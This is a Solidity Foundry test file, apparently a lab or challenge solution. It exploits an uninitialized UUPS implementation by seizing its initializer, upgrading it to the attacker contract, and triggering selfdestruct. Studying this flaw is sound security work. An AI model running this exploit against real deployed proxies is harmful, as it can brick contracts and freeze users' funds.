// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

import {Test, console2} from "forge-std/Test.sol";

import {UUPSBaseTest} from "./UUPSBase.t.sol";

contract UUPSTest is UUPSBaseTest {
    function testExploit() external validation {
        logic.initialize();
        bytes memory data = abi.encodeWithSignature("destroy()");
        logic.upgradeToAndCall(address(this), data);
    }

    function destroy() external {
        selfdestruct(payable(msg.sender));
    }
}